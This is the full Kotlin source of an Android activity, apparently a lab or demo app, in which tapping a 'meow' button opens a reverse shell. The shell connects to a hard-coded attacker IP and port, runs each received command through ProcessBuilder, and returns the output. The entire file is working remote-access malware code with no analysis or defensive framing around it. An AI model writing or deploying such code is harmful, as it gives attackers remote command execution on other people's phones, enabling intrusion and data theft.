package com.example.hackrev2

import android.os.Bundle
import android.widget.Button
import android.widget.Toast
import androidx.activity.ComponentActivity
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.Socket

class MainActivity : ComponentActivity() {
    private lateinit var meowButton: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        meowButton = findViewById(R.id.meowButton)
        meowButton.setOnClickListener {
            Toast.makeText(
                applicationContext,
                "Meow! reverse shell activated!",
                Toast.LENGTH_SHORT
            ).show()

            // Start the reverse shell in a background thread
            Thread {
                startReverseShell("172.16.16.251", 4444) // Your attacker's IP and port
            }.start()
        }
    }

    private fun startReverseShell(remoteHost: String, remotePort: Int) {
        try {
            // Create a socket connection to the attacker's machine
            val socket = Socket(remoteHost, remotePort)
            val inputStream = socket.getInputStream()
            val outputStream = socket.getOutputStream()

            val reader = BufferedReader(InputStreamReader(inputStream))
            val writer = outputStream.bufferedWriter()

            // Send a welcome message to the attacker
            writer.write("connected to android reverse shell! meow =^..^=\n")
            writer.flush()

            // Create a process to run shell commands
            while (true) {
                // Read commands from the attacker
                val command = reader.readLine()

                if (command == null || command.equals("exit", ignoreCase = true)) {
                    break
                }

                // Execute the command
                val process = ProcessBuilder(command.split(" ")).start()

                // Get the process output
                val processReader = BufferedReader(InputStreamReader(process.inputStream))
                val processOutput = StringBuilder()
                var line: String?
                while (processReader.readLine().also { line = it } != null) {
                    processOutput.append(line).append("\n")
                }

                // Send back the output of the command to the attacker
                writer.write(processOutput.toString())
                writer.flush()
            }

            // Close resources
            writer.close()
            reader.close()
            socket.close()

        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
